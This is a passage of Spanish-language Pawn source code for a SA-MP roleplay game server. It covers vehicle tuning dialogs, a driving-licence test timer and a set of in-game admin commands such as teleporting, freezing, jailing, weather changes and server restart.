		    TogglePlayerControllable(playerid, true);
		    if(response == 0) // Si clickearon cerrar
		        return 0;

			new title[64];
			new content[256];
		    switch(listitem)
		    {
		        case 0:
			    {
					format(title, sizeof(title), "Color 1");
					format(content, sizeof(content), "{FFEFD5}Ingrese el ID del color 1 a pintar:");
					TogglePlayerControllable(playerid, false);
					ShowPlayerDialog(playerid, DLG_TUNING_COLOR1, DIALOG_STYLE_INPUT, title, content, "Pintar", "Cerrar");
				}
				case 1:
				{
					format(title, sizeof(title), "Color 2");
					format(content, sizeof(content), "{FFEFD5}Ingrese el ID del color 2 a pintar:");
					TogglePlayerControllable(playerid, false);
					ShowPlayerDialog(playerid, DLG_TUNING_COLOR2, DIALOG_STYLE_INPUT, title, content, "Pintar", "Cerrar");
				}
				case 2:
    			{
    			    if(GetVehicleType(GetPlayerVehicleID(playerid)) == VTYPE_BIKE)
            			return SendClientMessage(playerid, COLOR_WHITE, "Vehiculo invalido!");

					format(title, sizeof(title), "Llantas");
					format(content, sizeof(content), "Offroad\nShadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAccess");
					TogglePlayerControllable(playerid, false);
					ShowPlayerDialog(playerid, DLG_TUNING_LLANTAS, DIALOG_STYLE_LIST, title, content, "Instalar", "Cerrar");
				}
				case 3:
				{
				    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
				        return SendClientMessage(playerid, COLOR_WHITE, "Debes estar de conductor!");
				    if(GetVehicleType(GetPlayerVehicleID(playerid)) == VTYPE_BIKE)
            			return SendClientMessage(playerid, COLOR_WHITE, "Vehiculo invalido!");
					if(GetPlayerCash(playerid) < 4000)
					    return SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($4000).");

                    new vID = GetPlayerVehicleID(playerid);
				    VehicleInfo[GetPlayerVehicleID(playerid)][VehCompSlot][9] = 1087;
				    AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
					GivePlayerCash(playerid, -4000);
				    PlayerActionMessage(playerid, 15.0, "comienza a instalar la suspension hidraulica en el vehiculo.");
				    SaveVehicle(vID);
				}
				case 4:
				{
				    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
				        return SendClientMessage(playerid, COLOR_WHITE, "Debes estar de conductor!");
				    if(GetVehicleType(GetPlayerVehicleID(playerid)) == VTYPE_BIKE)
            			return SendClientMessage(playerid, COLOR_WHITE, "Vehiculo invalido!");
					if(GetPlayerCash(playerid) < 10000)
					    return SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($10000).");

                    new vID = GetPlayerVehicleID(playerid);
				    VehicleInfo[GetPlayerVehicleID(playerid)][VehCompSlot][5] = 1010;
				    AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
					GivePlayerCash(playerid, -10000);
				    PlayerActionMessage(playerid, 15.0, "comienza a instalar el oxido nitroso en el vehiculo.");
				    SaveVehicle(vID);
				}
			}
		}
		case DLG_TUNING_COLOR1:
		{
		    TogglePlayerControllable(playerid, true);
		    if(response == 0) // Si clickearon cerrar
		        return 0;
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
      			return SendClientMessage(playerid, COLOR_WHITE, "Debes estar de conductor!");
			if(GetPlayerCash(playerid) < 1500)
				return SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($1500).");
			new integerColorValue = strval(inputtext);
			if(integerColorValue < 0 || integerColorValue > 255)
			    return SendClientMessage(playerid, COLOR_WHITE, "Ingresa un valor entre 0 y 255");

			PlayerActionMessage(playerid, 15.0, "comienza a pintar el color primario del vehiculo.");
			new vID = GetPlayerVehicleID(playerid);
            GivePlayerCash(playerid, -1500);
	        VehicleInfo[vID][VehColor1] = integerColorValue;
	        ChangeVehicleColor(vID, VehicleInfo[vID][VehColor1], VehicleInfo[vID][VehColor2]);
	        SaveVehicle(vID);
		}
		case DLG_TUNING_COLOR2:
		{
		    TogglePlayerControllable(playerid, true);
		    if(response == 0) // Si clickearon cerrar
		        return 0;
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
      			return SendClientMessage(playerid, COLOR_WHITE, "Debes estar de conductor!");
			if(GetPlayerCash(playerid) < 1500)
				return SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($1500).");
			new integerColorValue = strval(inputtext);
			if(integerColorValue < 0 || integerColorValue > 255)
			    return SendClientMessage(playerid, COLOR_WHITE, "Ingresa un valor entre 0 y 255.");

			PlayerActionMessage(playerid, 15.0, "comienza a pintar el color secundario del vehiculo.");
   			new vID = GetPlayerVehicleID(playerid);
            GivePlayerCash(playerid, -1500);
	        VehicleInfo[vID][VehColor2] = integerColorValue;
	        ChangeVehicleColor(vID, VehicleInfo[vID][VehColor1], VehicleInfo[vID][VehColor2]);
	        SaveVehicle(vID);
  		}
  		case DLG_TUNING_LLANTAS:
  		{
  		    TogglePlayerControllable(playerid, true);
		    if(response == 0) // Si clickearon cerrar
		        return 0;
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
      			return SendClientMessage(playerid, COLOR_WHITE, "Debes estar de conductor!");
			if(GetPlayerCash(playerid) < 4000)
				return SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($4000).");

            PlayerActionMessage(playerid, 15.0, "comienza a instalar las nuevas llantas en el vehiculo.");
			GivePlayerCash(playerid, -4000);
    		new vID = GetPlayerVehicleID(playerid),
    		    wheel;
			switch(listitem)
			{
			    case 0: wheel = OFFROAD_WHEEL_ID;
			    case 1: wheel = SHADOW_WHEEL_ID;
			    case 2: wheel = MEGA_WHEEL_ID;
			    case 3: wheel = RIMSHINE_WHEEL_ID;
			    case 4: wheel = WIRES_WHEEL_ID;
			    case 5: wheel = CLASSIC_WHEEL_ID;
			    case 6: wheel = TWIST_WHEEL_ID;
			    case 7: wheel = CUTTER_WHEEL_ID;
			    case 8: wheel = SWITCH_WHEEL_ID;
			    case 9: wheel = GROVE_WHEEL_ID;
			    case 10: wheel = IMPORT_WHEEL_ID;
			    case 11: wheel = DOLLAR_WHEEL_ID;
			    case 12: wheel = TRANCE_WHEEL_ID;
			    case 13: wheel = ATOMIC_WHEEL_ID;
			    case 14: wheel = AHAB_WHEEL_ID;
			    case 15: wheel = VIRTUAL_WHEEL_ID;
			    case 16: wheel = ACCESS_WHEEL_ID;
			}
   			AddVehicleComponent(vID, wheel);
			VehicleInfo[vID][VehCompSlot][7] = wheel;
			SaveVehicle(vID);
  		}
  		
//======================FIN SISTEMA DE TUNING DE MECANICOS======================
		
	}
    return 0;
}

public licenseTimer(playerid, lic) {
	new
	    vehicleID = GetPlayerVehicleID(playerid),
		Float:pSpeed = GetPlayerSpeed(playerid, true),
	    string[128];

	switch(lic) {
	    case 1: {   // Conducci�n
			if(pSpeed > playerLicense[playerid][lDMaxSpeed])
				playerLicense[playerid][lDMaxSpeed] = pSpeed;

	        playerLicense[playerid][lDTime]++;
	    	format(string, sizeof(string), "Tiempo: %d", playerLicense[playerid][lDTime]);
    		PlayerTextDrawSetString(playerid, PTD_Timer[playerid], string);

    		if(playerLicense[playerid][lDTime] >= 520) {
    		    SendClientMessage(playerid, COLOR_LIGHTRED, "Has fallado la prueba por exceder el tiempo l�mite (520 segundos).");
          		DisablePlayerCheckpoint(playerid);
		    	SetVehicleToRespawn(vehicleID);
		    	PutPlayerInVehicle(playerid, vehicleID, 0);
				RemovePlayerFromVehicle(playerid);
	            playerLicense[playerid][lDTaking] = 0;
	            playerLicense[playerid][lDTime] = 0;
	            playerLicense[playerid][lDStep] = 0;
	            playerLicense[playerid][lDMaxSpeed] = 0;
	        }
	        
	        if(playerLicense[playerid][lDTaking] != 0)
				timersID[10] = SetTimerEx("licenseTimer", 1000, false, "dd", playerid, 1);
	    }
	}
	return 1;
}

CMD:pos(playerid, params[])
{
	new string[128],
		Float:posX,
		Float:posY,
		Float:posZ,
		Float:posAngle,
		virtualWorld,
		interior;

	GetPlayerPos(playerid, posX, posY, posZ);
	GetPlayerFacingAngle(playerid, posAngle);
	virtualWorld = GetPlayerVirtualWorld(playerid);
	interior = GetPlayerInterior(playerid);
	format(string, sizeof(string), "[DEBUG]: xPos:%f yPos:%f zPos:%f Angulo:%f Mundo:%d Int:%d", posX, posY, posZ, posAngle, virtualWorld, interior);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:resetcars(playerid, params[])
{
	new pass[128],
 		id = 1;

	if(sscanf(params, "s[128]", pass))
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /resetcars [contrase�a de seguridad]");
	else if(!strcmp(pass,SECPASS,false))
	{
		while(id < MAX_VEH)
		{
			if(VehicleInfo[id][VehType] == VEH_OWNED)
			{
				VehicleInfo[id][VehType] = VEH_NONE;
				SetVehicleToRespawn(id);
			}
			id++;
		}
		printf("[RESET]: los veh�culos han sido reseteados por %s.",GetPlayerNameEx(playerid));
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Has reseteado todos los veh�culos del servidor.");
	}
	else
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "{FF4600}[Error]:{C8C8C8} contrase�a de seguridad incorrecta");
	return 1;
}

CMD:aservicio(playerid, params[])
{
    new Float:hp;

	if(AdminDuty[playerid] == 1)
	{
		AdminDuty[playerid] = 0;
		SetPlayerHealthEx(playerid, GetPVarFloat(playerid, "tempHealth"));
		SetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);
		SetPlayerColor(playerid, 0xFFFFFF00);
	}
	else
	{
		AdminDuty[playerid] = 1;
		SetPlayerColor(playerid, COLOR_ADMINDUTY);
		GetPlayerHealthEx(playerid, hp);
		SetPVarFloat(playerid, "tempHealth", hp);
		GetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);
		SetPlayerHealthEx(playerid, 50000);
		SetPlayerArmour(playerid, 50000);
	}

	return 1;
}

CMD:acmds(playerid, params[]) {
    #pragma unused params
	cmd_admincmds(playerid, params);
	return 1;
}

CMD:admincmds(playerid, params[]) {

	if(PlayerInfo[playerid][pAdmin] >= 1) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/a /ao /ajail /aservicio /getpos /gotopos /gotols /gotospawn /gotolv /gotosf");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/goto /kick /mute /skin /traer /up /descongelar /congelar /slap /muteb /teleayuda (/av)hiculo");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/vermascara /vermascaras /crearcuenta");
	}
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/acinfo /aninfo /aeinfo /actele /antele /aetele /ban /check /checkinv /fly /sethp");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/mps /setint /setvw /set /togglegooc /verf");
	}
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/afexpulsar /cambiarnombre /afinfo /jetx /setarmour /setjob /setcoord");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/aobjeto /aeditobjeto /ainfoobjetos /aobjetosquitartodo /aobjetoquitar");
	}
	if(PlayerInfo[playerid][pAdmin] >= 4) {
    	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/givegun /advertir /clima /darlider /desbanear /saltartuto /tutorial /anproductos /annombre /gametext /sinfo");
	}
	if(PlayerInfo[playerid][pAdmin] >= 20) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/acasas /aedificios /afacciones /anegocios /ppvehiculos /gmx /exit /tod /unknowngametext /money /givemoney");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/resetcars /setadmin /rerollplates");
	}
	return 1;
}

CMD:saltartuto(playerid, params[])
{
	new targetID;

	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /saltartuto [ID-Jugador]");
	
	StopAudioStreamForPlayer(playerid);
	PlayerInfo[playerid][pTutorial] = 1;
	
	// Cerramos cualquier dialog y textdraw abierto.
	ShowPlayerDialog(playerid, -1, DIALOG_STYLE_MSGBOX, " ", " ", " ", ""); 
	for(new i = 0; i < 7; i++) {
	    PlayerTextDrawHide(playerid, TutTD_Text[playerid][i]);
	}
	TextDrawHideForPlayer(playerid, TutTDBackground);
	
	if(PlayerInfo[playerid][pRegStep] != 0) {
		TextDrawShowForPlayer(playerid, RegTDBorder1);
		TextDrawShowForPlayer(playerid, RegTDBorder2);
		TextDrawShowForPlayer(playerid, RegTDTitle);
		TextDrawShowForPlayer(playerid, RegTDBackground);
		PlayerTextDrawShow(playerid, RegTDGender[playerid]);
		PlayerTextDrawShow(playerid, RegTDSkin[playerid]);
		PlayerTextDrawShow(playerid, RegTDAge[playerid]);
		PlayerTextDrawShow(playerid, RegTDOrigin[playerid]);

		PlayerInfo[playerid][pSex] = 1;
		PlayerInfo[playerid][pSkin] = SkinRegMale[0][0];
		PlayerInfo[playerid][pRegStep] = 1;

		SetPlayerInterior(playerid, 14);
     	SetPlayerVirtualWorld(playerid, random(100000) + 44000);

		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Presiona ~k~~PED_SPRINT~ para seleccionar una opci�n, ~k~~VEHICLE_ENTER_EXIT~ para finalizar.");
		SetSpawnInfo(playerid, 0, SkinRegMale[0][0], -1828.2881, -30.3119, 1061.1436, 182.0051, 0, 0, 0, 0, 0, 0);
	} else {
		SetSpawnInfo(playerid, 0, PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ], PlayerInfo[playerid][pA], 0, 0, 0, 0, 0, 0);
	}
	TogglePlayerSpectating(playerid, false);
	
	SpawnPlayer(targetID);
	return 1;
}

CMD:tutorial(playerid, params[])
{
	new targetID;

	if(sscanf(params, "u", targetID))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /tutorial [ID-Jugador]");

	PlayerInfo[targetID][pTutorial] = 0;
	KickPlayer(targetID, GetPlayerNameEx(playerid), "rehacer el tutorial");
	return 1;
}

CMD:teleayuda(playerid, params[])
{
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/up /gotolv /gotosf /gotols /goto /gotopos /traer /gotospawn");
	return 1;
}

CMD:getpos(playerid, params[]) {
	new
	    string[128],
	    targetID,
		Float:posX,
		Float:posY,
		Float:posZ,
		Float:posAngle,
		virtualWorld,
		interior;

	if(sscanf(params,"u", targetID)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /getpos [ID-Jugador]");
	else if(targetID != INVALID_PLAYER_ID) {
		GetPlayerPos(targetID, posX, posY, posZ);
		GetPlayerFacingAngle(targetID, posAngle);
		virtualWorld = GetPlayerVirtualWorld(targetID);
		interior = GetPlayerInterior(targetID);
		format(string, sizeof(string), "Posici�n de %s | xPos:%f yPos:%f zPos:%f Angulo:%f Mundo:%d Int:%d", GetPlayerNameEx(targetID), posX, posY, posZ, posAngle, virtualWorld, interior);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	return 1;
}

CMD:ajail(playerid, params[])
{
	new string[128],
	    targetID,
		minutes,
		reason[64];

	if(sscanf(params,"uds[64]", targetID, minutes, reason))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /ajail [ID-Jugador] [minutos] [raz�n]");
	if(!IsPlayerConnected(targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "ID inv�lida.");
		
	format(string, sizeof(string), "[Admin %s] %s ha sido castigado por %d minutos (raz�n: %s).", GetPlayerNameEx(playerid), GetPlayerNameEx(targetID), minutes, reason);
	SendClientMessageToAll(COLOR_ADMINCMD, string);
	SendClientMessage(targetID, COLOR_LIGHTYELLOW2, "Recuerda que al estar castigado no se resetear� el tiempo para volver a trabajar hasta el proximo PayDay en libertad.");
	ResetPlayerWeapons(targetID);
	PlayerInfo[targetID][pJailed] = 2;
	PlayerInfo[targetID][pJailTime] = minutes * 60;
	SetPlayerInterior(targetID, 6);
	SetPlayerPos(targetID, 1412.01, -2.59, 1001.47);
	SetPlayerVirtualWorld(targetID, 0);
	format(string, sizeof(string), "[AJAIL] %d min a %s razon %s", minutes, GetPlayerNameEx(targetID), reason);
	log(playerid, LOG_ADMIN, string);
	return 1;
}

CMD:traer(playerid, params[])
{
	new	Float:xPos,
		Float:yPos,
		Float:zPos,
		interior,
		virtualWorld,
		targetID,
		string[128];

	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /traer [ID-Jugador]");
	if(!IsPlayerConnected(targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "ID inv�lida.");
		
	GetPlayerPos(playerid, xPos, yPos, zPos);
	interior = GetPlayerInterior(playerid);
	virtualWorld = GetPlayerVirtualWorld(playerid);
	SetPlayerVirtualWorld(targetID, virtualWorld);
	SetPlayerInterior(targetID, interior);
	if(GetPlayerState(targetID) == 2)
		SetVehiclePos(GetPlayerVehicleID(targetID), xPos, yPos+4, zPos);
	else
		SetPlayerPos(targetID, xPos, yPos+2, zPos);
	format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} el administrador %s te ha teletransportado junto a �l.", GetPlayerNameEx(playerid));
	SendClientMessage(targetID, COLOR_LIGHTYELLOW2, string);
	return 1;
}

CMD:gotopos(playerid, params[]) {
	new
		Float:xPos,
		Float:yPos,
		Float:zPos;

	if(sscanf(params,"fff", xPos, yPos, zPos)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /gotopos [x] [y] [z]");
	else {
		if(GetPlayerState(playerid) == 2) {
			SetVehiclePos(GetPlayerVehicleID(playerid), xPos, yPos, zPos);
		}else {
			SetPlayerPos(playerid, xPos, yPos, zPos);
		}
	}
	return 1;
}

CMD:goto(playerid, params[]) {
	new
		Float:xPos,
		Float:yPos,
		Float:zPos,
		interior,
		virtualWorld,
		targetID;

	if(sscanf(params,"u", targetID)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /goto [ID-Jugador]");
	else if(targetID != INVALID_PLAYER_ID) {
		GetPlayerPos(targetID, xPos, yPos, zPos);
		interior = GetPlayerInterior(targetID);
		virtualWorld = GetPlayerVirtualWorld(targetID);
		SetPlayerVirtualWorld(playerid, virtualWorld);
		SetPlayerInterior(playerid, interior);
		if(GetPlayerState(playerid) == 2) {
			SetVehiclePos(GetPlayerVehicleID(playerid), xPos, yPos+4, zPos);
		} else {
			SetPlayerPos(playerid, xPos, yPos+2, zPos);
		}
	}
	return 1;
}

CMD:gotols(playerid, params[]) {

	if(GetPlayerState(playerid) == 2) {
		SetVehiclePos(GetPlayerVehicleID(playerid), 1529.6, -1691.2, 13.3);
	}else {
		SetPlayerPos(playerid, 1529.6, -1691.2, 13.3);
	}
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

CMD:gotospawn(playerid, params[]) {

	if(GetPlayerState(playerid) == 2) {
		SetVehiclePos(GetPlayerVehicleID(playerid), 1681.5281,-2256.2827,13.3512);
	}else {
		SetPlayerPos(playerid, 1682.9645, -2244.8215, 13.5445);
	}
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

CMD:gotolv(playerid, params[]) {

	if(GetPlayerState(playerid) == 2) {
		SetVehiclePos(GetPlayerVehicleID(playerid), 1699.2, 1435.1, 10.7);
	}else {
		SetPlayerPos(playerid, 1699.2, 1435.1, 10.7);
	}
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

CMD:gotosf(playerid, params[]) {

	if(GetPlayerState(playerid) == 2) {
		SetVehiclePos(GetPlayerVehicleID(playerid), -1417.0,-295.8,14.1);
	}else {
		SetPlayerPos(playerid, -1417.0,-295.8,14.1);
	}
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

CMD:gotobanco(playerid, params[])
{

    SetPlayerPos(playerid, POS_BANK_X, POS_BANK_Y, POS_BANK_Z);
	SetPlayerInterior(playerid, POS_BANK_I);
	SetPlayerVirtualWorld(playerid, POS_BANK_W);
	return 1;
}

CMD:descongelar(playerid, params[])
{
    new string[128],
		targetid;

	if(sscanf(params, "i", targetid))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /descongelar [ID/Jugador]");
	if(!IsPlayerConnected(targetid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "ID de jugador iv�lida.");
	    
	TogglePlayerControllable(targetid, true);
	SetPVarInt(targetid, "disabled", DISABLE_NONE);
	SendFMessage(targetid, COLOR_LIGHTYELLOW2,"{878EE7}[INFO]:{C8C8C8} has sido descongelado por %s.", GetPlayerNameEx(playerid));
	format(string, sizeof(string), "[Staff]: %s ha descongelado a %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid));
	AdministratorMessage(COLOR_ADMINCMD, string, 1);
	return 1;
}

CMD:congelar(playerid, params[])
{
    new string[128],
		targetid;

	if(sscanf(params, "i", targetid))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /congelar [ID/Jugador]");
	if(!IsPlayerConnected(targetid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "ID de jugador iv�lida.");

	TogglePlayerControllable(targetid, false);
	SetPVarInt(targetid, "disabled", DISABLE_FREEZE);
	SendFMessage(targetid, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} has sido congelado por %s.", GetPlayerNameEx(playerid));
	format(string, sizeof(string), "[Staff]: %s ha congelado a %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid));
	AdministratorMessage(COLOR_ADMINCMD, string, 1);
	return 1;
}

CMD:setcoord(playerid, params[]) {
	new
		targetid,
		Float:x,
		Float:y,
		Float:z,
		string[128];

	if(sscanf(params, "dfff", targetid, x, y, z)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /setcoord [ID-Jugador] [x] [y] [z]");
	else
	{
		if(IsPlayerInAnyVehicle(targetid))
		{
			SetVehiclePos(GetPlayerVehicleID(targetid), x,y,z);
		}
		else
		{
			SetPlayerPos(targetid, x,y,z);
		}
		format(string,sizeof(string),"* El administrador %s te ha teletransportado. *", GetPlayerNameEx(playerid));
        SendClientMessage(targetid, COLOR_LIGHTBLUE, string);
	}
	return 1;
}

CMD:setint(playerid, params[]) {
	new
		interior,
		targetid;

	if(sscanf(params,"ud", targetid, interior)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /setint [ID-Jugador] [interior]");
	else
	{
		if(IsPlayerInAnyVehicle(targetid))
		{
		    LinkVehicleToInterior(GetPlayerVehicleID(targetid), interior);
		}
        SetPlayerInterior(targetid, interior);
	}
	return 1;
}

CMD:setvw(playerid, params[]) {
	new
		world,
		targetid;

	if(sscanf(params,"ud", targetid, world)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /setvw [ID-Jugador] [mundo virtual]");
	else {
        SetPlayerVirtualWorld(targetid, world);
	}
	return 1;
}

CMD:recordjugadores(playerid, params[]) {
	SendFMessage(playerid, COLOR_LIGHTYELLOW, "{878EE7}[INFO]:{C8C8C8} el record actual de jugadores es de %d.", ServerInfo[sPlayersRecord]);
	return 1;
}

CMD:d(playerid, params[]) {
	cmd_departamento(playerid, params);
	return 1;
}

CMD:departamento(playerid, params[])
{
	new text[128], string[128], factionID = PlayerInfo[playerid][pFaction];

    if(factionID == 0)
		return 1;
	if(FactionInfo[factionID][fType] != FAC_TYPE_GOV)
        return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes permiso para hablar por esta frecuencia.");
	if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/d)epartamento [texto]");
	if(PlayerInfo[playerid][pRadio] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes una radio, v� y compra una en alg�n 24-7.");
	if(!RadioEnabled[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes tu radio apagada.");
    if(Muted[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW, "{FF4600}[Error]:{C8C8C8} no puedes usar la radio, te encuentras silenciado.");

	PlayerActionMessage(playerid, 15.0, "toma una radio de su bolsillo y habla por ella.");
	if(!usingMask[playerid])
		format(string, sizeof(string), "%s dice por radio: %s", GetPlayerNameEx(playerid), text);
	else
 		format(string, sizeof(string), "Enmascarado %d dice por radio: %s", maskNumber[playerid], text);
	ProxDetector(15.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5, 0);
	format(string, sizeof(string), "[%s %s]: %s", GetRankName(PlayerInfo[playerid][pFaction], PlayerInfo[playerid][pRank]), GetPlayerNameEx(playerid), text);
 	foreach(new i : Player) {
		if(FactionInfo[PlayerInfo[i][pFaction]][fType] == FAC_TYPE_GOV && RadioEnabled[i] && PlayerInfo[i][pRadio] != 0) {
			SendClientMessage(i, COLOR_LIGHTGREEN, string);
		}
  	}
	return 1;
}

CMD:gob(playerid, params[]) {
	cmd_gobierno(playerid, params);
	return 1;
}

CMD:gobierno(playerid, params[])
{
	new string[128];

	if(sscanf(params, "s[128]", string))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/gob)ierno [texto]");
	if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] != FAC_TYPE_GOV || PlayerInfo[playerid][pRank] != 1)
		return SendClientMessage(playerid, COLOR_YELLOW2, "{FF4600}[Error]:{C8C8C8} No tienes permiso para hablar por esta frecuencia.");

	SendClientMessageToAll(COLOR_YELLOW2, "============================[Cadena Nacional]===========================");
	if(PlayerInfo[playerid][pFaction] == FAC_HOSP) {
		format(string, sizeof(string), "Hospital de Malos Aires: %s", string);
	} else
		if(PlayerInfo[playerid][pFaction] == FAC_PMA) {
	 		format(string, sizeof(string), "Polic�a Metropolitana: %s", string);
		} else
			if(PlayerInfo[playerid][pFaction] == FAC_SIDE) {
		 		format(string, sizeof(string), "Secretar�a de Inteligencia: %s", string);
			}
	SendClientMessageToAll(COLOR_YELLOW2, string);
	SendFMessageToAll(COLOR_YELLOW2, "%s %s", GetRankName(PlayerInfo[playerid][pFaction], PlayerInfo[playerid][pRank]), GetPlayerNameEx(playerid));
	SendClientMessageToAll(COLOR_YELLOW2, "======================================================================");
	return 1;
}

CMD:darlider(playerid, params[])
{
	new targetid, factionid;

	if(sscanf(params,"ud", targetid, factionid))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /darlider [ID/Jugador] [IDfacci�n]");
  	if(targetid == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_YELLOW2, "{FF4600}[Error]:{C8C8C8} jugador inv�lido.");
	if(PlayerInfo[targetid][pFaction] != 0)
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} El sujeto ya tiene facci�n.");

	SetPlayerFaction(targetid, factionid, 1);
	SendFMessage(playerid, COLOR_LIGHTBLUE, "{878EE7}[INFO]:{C8C8C8} has hecho a %s l�der de la facci�n ID: %d (%s).", GetPlayerNameEx(targetid), factionid, FactionInfo[factionid][fName]);
	SendFMessage(targetid, COLOR_LIGHTBLUE, "{878EE7}[INFO]:{C8C8C8} el administrador %s te ha hecho l�der de la facci�n %s.", GetPlayerNameEx(playerid), FactionInfo[factionid][fName]);
	return 1;
}

//=========================COMANDOS VARIOS DE ADMIN=============================

CMD:clima(playerid, params[]) {

	if(isnull(params))
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} no se ha especificado una ID.");

	new
		weatherID = strval(params);

	if(weatherID >= -500 && weatherID <= 500) {
		weatherVariables[0] = weatherID;
		foreach(new i : Player) {
			if(!GetPlayerInterior(i))
				SetPlayerWeather(i, weatherVariables[0]);
		}
	} else {
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} ID inv�lida (-500 - 500).");
	}
	return 1;
}

CMD:gmx(playerid, params[]) {
	new
		Float:x,
		Float:y,
		Float:z,
		Float:a;

	foreach(new i : Player) {
  		DisablePlayerCheckpoint(i);
		SetPlayerCameraPos(i,1460.0, -1324.0, 287.2);
		SetPlayerCameraLookAt(i,1374.5, -1291.1, 239.0, 1);
        GetPlayerPos(i,x,y,z);
        GetPlayerFacingAngle(i, a);
	    PlayerInfo[i][pX] = x;
		PlayerInfo[i][pY] = y;
		PlayerInfo[i][pZ] = z;
		PlayerInfo[i][pInterior] = GetPlayerInterior(i);
		PlayerInfo[i][pVirtualWorld] = GetPlayerVirtualWorld(i);
		PlayerInfo[i][pA] = a;
		SaveAccount(i);
		gPlayerLogged[i] = 0;
	}
	SaveServerInfo();
 	SaveFactions();
	SaveVehicles();
	SaveHouses();
	SaveAllBusiness();
	saveBuildings();
	iGMXTick = 11;
	timersID[9] = SetTimerEx("restartTimer", 1000, true, "i", 0);
	return 1;
}

